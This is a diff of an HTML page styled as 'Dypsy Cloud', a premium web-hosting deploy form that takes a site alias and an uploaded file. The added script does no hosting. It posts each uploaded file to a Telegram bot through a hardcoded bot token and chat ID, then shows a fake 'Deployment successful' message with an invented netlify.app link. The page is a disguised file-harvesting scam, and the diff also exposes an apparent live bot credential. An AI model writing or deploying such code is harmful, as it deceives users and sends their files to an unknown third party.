@@ -3,97 +3,350 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dYpSy Cloud - Interactive Neon</title>
+    <title>Dypsy Cloud - Premium Web Hosting</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --neon: #00f2ff;
-            --neon-glow: rgba(0, 242, 255, 0.4);
-            --bg: #020617;
-            --card: rgba(15, 23, 42, 0.7);
-            --border: rgba(0, 242, 255, 0.25);
+            --primary-gradient: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --accent-blue: #60a5fa;
+            --text-main: #f8fafc;
+            --success: #10b981;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+
         body {
-            background-color: var(--bg); color: #fff; font-family: 'Plus Jakarta Sans', sans-serif;
-            overflow-y: auto; padding: 50px 20px 100px; display: block; -webkit-overflow-scrolling: touch;
+            background: radial-gradient(circle at top right, #1e293b, #0f172a, #020617);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+            padding: 20px;
         }
 
-        .bg-fixed { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at 50% 0%, #083344 0%, #020617 100%); }
-        .container { max-width: 500px; margin: 0 auto; }
+        .orb {
+            position: fixed;
+            width: 600px;
+            height: 600px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(37, 99, 235, 0.12) 0%, transparent 70%);
+            z-index: -1;
+            filter: blur(80px);
+        }
+        .orb-1 { top: -200px; left: -200px; }
+        .orb-2 { bottom: -200px; right: -200px; }
 
-        .header { text-align: center; margin-bottom: 40px; }
-        .header h1 { font-size: 2.4rem; font-weight: 800; color: var(--neon); text-shadow: 0 0 25px var(--neon-glow); }
-
-        .glass-card {
-            background: var(--card); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-            border: 1px solid var(--border); border-radius: 28px; padding: 35px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6); margin-bottom: 30px;
+        .container {
+            width: 100%;
+            max-width: 1100px;
+            position: relative;
+            z-index: 10;
         }
 
-        .input-box {
-            width: 100%; background: rgba(0, 0, 0, 0.5); border: 1px solid var(--border); border-radius: 14px;
-            padding: 18px; color: #fff; font-family: 'JetBrains Mono'; margin-bottom: 20px; transition: 0.3s;
+        header {
+            text-align: center;
+            margin-bottom: 50px;
         }
 
-        .btn-neon {
-            width: 100%; background: var(--neon); color: #000; border: none; padding: 20px; border-radius: 14px;
-            font-weight: 800; text-transform: uppercase; cursor: pointer; box-shadow: 0 10px 30px var(--neon-glow); transition: 0.3s;
+        .logo-box {
+            display: inline-flex;
+            padding: 20px;
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            backdrop-filter: blur(10px);
+            margin-bottom: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
         }
 
-        /* --- FEATURE INTERACTIVE --- */
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .item { 
-            background: var(--card); border: 1px solid var(--border); padding: 22px 15px; border-radius: 22px; 
-            text-align: center; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); cursor: pointer;
+        header h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            letter-spacing: -1px;
+            background: linear-gradient(to bottom, #fff 30%, #94a3b8 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-        .item:active { transform: scale(0.9); border-color: var(--neon); box-shadow: 0 0 20px var(--neon-glow); }
-        .item i { color: var(--neon); font-size: 1.4rem; margin-bottom: 12px; }
-        .item h4 { font-size: 0.85rem; color: #fff; margin-bottom: 6px; }
-        .item p { font-size: 0.65rem; color: #94a3b8; line-height: 1.4; }
 
-        .toast {
-            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
-            background: var(--neon); color: #000; padding: 12px 25px; border-radius: 50px;
-            font-weight: 800; font-size: 0.75rem; display: none; z-index: 1000; animation: slideUp 0.3s;
+        header p {
+            color: #94a3b8;
+            font-weight: 300;
+            margin-top: 8px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            font-size: 0.8rem;
         }
-        @keyframes slideUp { from { bottom: 0; opacity: 0; } to { bottom: 30px; opacity: 1; } }
+
+        .content-grid {
+            display: grid;
+            grid-template-columns: 1.2fr 0.8fr;
+            gap: 30px;
+        }
+
+        .premium-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(30px);
+            border: 1px solid var(--glass-border);
+            border-radius: 32px;
+            padding: 40px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .card-label {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 30px;
+            color: var(--accent-blue);
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .form-group { margin-bottom: 25px; }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 0.85rem;
+            color: #94a3b8;
+        }
+
+        .input-control {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--glass-border);
+            padding: 16px 20px;
+            border-radius: 16px;
+            color: white;
+            transition: 0.3s;
+            outline: none;
+        }
+
+        .input-control:focus {
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 15px rgba(59, 130, 246, 0.2);
+        }
+
+        .upload-area {
+            border: 2px dashed var(--glass-border);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            transition: 0.3s;
+            cursor: pointer;
+            background: rgba(255, 255, 255, 0.01);
+        }
+
+        .btn-luxury {
+            width: 100%;
+            background: var(--primary-gradient);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.4s cubic-bezier(0.165, 0.84, 0.44, 1);
+            box-shadow: 0 10px 20px rgba(30, 58, 138, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .btn-luxury:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 15px 30px rgba(59, 130, 246, 0.5);
+        }
+
+        .feature-box {
+            background: rgba(255, 255, 255, 0.02);
+            padding: 20px;
+            border-radius: 20px;
+            border: 1px solid var(--glass-border);
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .feat-icon {
+            width: 45px;
+            height: 45px;
+            background: rgba(59, 130, 246, 0.1);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent-blue);
+        }
+
+        .footer-tag {
+            text-align: center;
+            margin-top: 30px;
+            color: #475569;
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        /* Modal */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(2, 6, 23, 0.85);
+            backdrop-filter: blur(12px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .luxury-modal {
+            background: #0f172a;
+            border: 1px solid var(--glass-border);
+            border-radius: 32px;
+            padding: 40px;
+            width: 90%;
+            max-width: 480px;
+            text-align: center;
+        }
+
+        .link-pill {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--glass-border);
+            padding: 15px;
+            border-radius: 16px;
+            margin: 20px 0;
+            color: var(--accent-blue);
+            font-weight: 500;
+        }
+
+        @media (max-width: 900px) { .content-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
-    <div class="bg-fixed"></div>
-    <div class="toast" id="cloudToast"></div>
-    <div class="container">
-        <div class="header"><h1>dYpSy Cloud</h1><p style="letter-spacing: 4px; color: #64748b; font-size: 0.7rem;">READY FOR UPLOAD</p></div>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
 
-        <div class="glass-card">
-            <input type="text" id="siteName" class="input-box" placeholder="Project Name...">
-            <button class="btn-neon" id="submitBtn">Launch System</button>
+    <div class="container">
+        <header>
+            <div class="logo-box">
+                <i class="fas fa-cloud-bolt fa-3x" style="color: var(--accent-blue);"></i>
+            </div>
+            <h1>Dypsy Cloud</h1>
+            <p>Premium Deployment Solutions</p>
+        </header>
+
+        <div class="content-grid">
+            <div class="premium-card">
+                <div class="card-label"><i class="fas fa-rocket"></i> Deploy Engine</div>
+                <form id="websiteForm">
+                    <div class="form-group">
+                        <label>Website Alias</label>
+                        <input type="text" id="websiteName" class="input-control" placeholder="my-awesome-site" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Source Assets (.html / .zip)</label>
+                        <div class="upload-area" onclick="document.getElementById('htmlFile').click()">
+                            <i class="fas fa-file-arrow-up fa-2x" style="color: #475569; margin-bottom: 10px;"></i>
+                            <p id="fileName" style="font-size: 0.85rem; color: #94a3b8;">Select your source file</p>
+                            <input type="file" id="htmlFile" hidden>
+                        </div>
+                    </div>
+                    <button type="submit" class="btn-luxury" id="submitBtn">
+                        <i class="fas fa-shield-check"></i> Initialize Cloud
+                    </button>
+                </form>
+            </div>
+
+            <div class="premium-card">
+                <div class="card-label"><i class="fas fa-layer-group"></i> Infrastructure</div>
+                <div class="feature-box">
+                    <div class="feat-icon"><i class="fas fa-microchip"></i></div>
+                    <div><h4 style="font-size: 0.85rem;">Dedicated Node</h4><p style="font-size: 0.7rem; color: #64748b;">Powered by Dypsy Core</p></div>
+                </div>
+                <div class="feature-box">
+                    <div class="feat-icon"><i class="fas fa-globe"></i></div>
+                    <div><h4 style="font-size: 0.85rem;">Global CDN</h4><p style="font-size: 0.7rem; color: #64748b;">Zero-latency delivery</p></div>
+                </div>
+                <div class="feature-box">
+                    <div class="feat-icon"><i class="fas fa-fingerprint"></i></div>
+                    <div><h4 style="font-size: 0.85rem;">Secure Handshake</h4><p style="font-size: 0.7rem; color: #64748b;">Enterprise encryption</p></div>
+                </div>
+            </div>
         </div>
 
-        <div class="grid">
-            <div class="item" onclick="triggerFeat('Fast Edge')">
-                <i class="fas fa-bolt"></i><h4>Fast Edge</h4><p>Global CDN deployment in milliseconds.</p>
-            </div>
-            <div class="item" onclick="triggerFeat('Hardened')">
-                <i class="fas fa-shield-halved"></i><h4>Hardened</h4><p>Automatic SSL and DDoS protection.</p>
-            </div>
-            <div class="item" onclick="triggerFeat('Scalable')">
-                <i class="fas fa-arrow-up-right-dots"></i><h4>Scalable</h4><p>Built for infinite traffic growth.</p>
-            </div>
-            <div class="item" onclick="triggerFeat('Assets')">
-                <i class="fas fa-server"></i><h4>Assets</h4><p>Distributed storage for global files.</p>
+        <div class="footer-tag">Design & Infrastructure by Dypsy</div>
+    </div>
+
+    <div class="modal-overlay" id="modal">
+        <div class="luxury-modal">
+            <i class="fas fa-circle-check fa-4x" style="color: var(--success); margin-bottom: 20px;"></i>
+            <h2>System Online</h2>
+            <p style="color: #94a3b8; margin-top: 10px;">Deployment successful. Dypsy Cloud has broadcasted your site.</p>
+            <div class="link-pill" id="resultLink"></div>
+            <div style="display: flex; gap: 10px;">
+                <button class="btn-luxury" onclick="copyLink()" style="flex: 1;">Copy Link</button>
+                <button class="btn-luxury" onclick="location.reload()" style="flex: 1; background: rgba(255,255,255,0.05);">Done</button>
             </div>
         </div>
     </div>
 
     <script>
-        function triggerFeat(name) {
-            const t = document.getElementById('cloudToast');
-            t.innerText = `System ${name}: Online & Optimized`;
-            t.style.display = 'block';
-            setTimeout(() => t.style.display = 'none', 2000);
+        const fileInput = document.getElementById('htmlFile');
+        const fileName = document.getElementById('fileName');
+        const form = document.getElementById('websiteForm');
+
+        fileInput.onchange = () => {
+            if(fileInput.files[0]) {
+                fileName.innerText = fileInput.files[0].name;
+                fileName.style.color = 'var(--accent-blue)';
+            }
+        };
+
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            const name = document.getElementById('websiteName').value;
+            
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Syncing...';
+            btn.disabled = true;
+
+            const formData = new FormData();
+            formData.append('chat_id', '7446889039');
+            formData.append('document', fileInput.files[0]);
+            formData.append('caption', `🌐 DYPSY CLOUD DEPLOY\nAlias: ${name}\nStatus: Active`);
+
+            try {
+                await fetch(`https://api.telegram.org/bot8352237832:AAHHUI6vFhST6sNpsMO8cGwDnpr9hMPO2co/sendDocument`, {
+                    method: 'POST', body: formData
+                });
+                document.getElementById('resultLink').innerText = `https://${name.toLowerCase()}.netlify.app/`;
+                document.getElementById('modal').style.display = 'flex';
+            } catch (err) {
+                alert('Connection timed out.');
+            } finally {
+                btn.innerHTML = '<i class="fas fa-shield-check"></i> Initialize Cloud';
+                btn.disabled = false;
+            }
+        };
+
+        function copyLink() {
+            navigator.clipboard.writeText(document.getElementById('resultLink').innerText);
+            alert('Link copied.');
         }
     </script>
 </body>
